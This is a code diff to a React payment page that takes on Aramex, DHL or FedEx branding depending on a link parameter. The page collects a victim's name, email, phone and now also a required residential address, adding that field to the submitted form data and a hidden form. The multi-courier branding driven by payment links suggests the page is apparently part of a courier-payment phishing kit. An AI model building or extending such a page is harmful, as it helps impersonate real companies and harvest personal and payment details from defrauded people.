@@ -8,7 +8,7 @@ import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -31,6 +31,7 @@ const PaymentRecipient = () => {
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
+  const [residentialAddress, setResidentialAddress] = useState("");
   
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -70,6 +71,7 @@ const PaymentRecipient = () => {
     formData.append('name', customerName);
     formData.append('email', customerEmail);
     formData.append('phone', customerPhone);
+    formData.append('address', residentialAddress);
     formData.append('service', serviceName);
     formData.append('amount', formattedAmount);
     formData.append('linkId', id || '');
@@ -88,6 +90,7 @@ const PaymentRecipient = () => {
       name: customerName,
       email: customerEmail,
       phone: customerPhone,
+      address: residentialAddress,
       service: serviceName,
       amount: formattedAmount
     }));
@@ -203,6 +206,21 @@ const PaymentRecipient = () => {
                       placeholder="+966 5X XXX XXXX"
                     />
                   </div>
+                  
+                  <div>
+                    <Label htmlFor="address" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
+                      <MapPin className="w-3 h-3 sm:w-4 sm:h-4" />
+                      العنوان السكني
+                    </Label>
+                    <Input
+                      id="address"
+                      value={residentialAddress}
+                      onChange={(e) => setResidentialAddress(e.target.value)}
+                      required
+                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      placeholder="أدخل عنوانك السكني الكامل"
+                    />
+                  </div>
                 </div>
               
                 <Button
@@ -227,6 +245,7 @@ const PaymentRecipient = () => {
                 <input type="text" name="name" />
                 <input type="email" name="email" />
                 <input type="tel" name="phone" />
+                <input type="text" name="address" />
                 <input type="text" name="service" />
                 <input type="text" name="amount" />
                 <input type="text" name="linkId" />
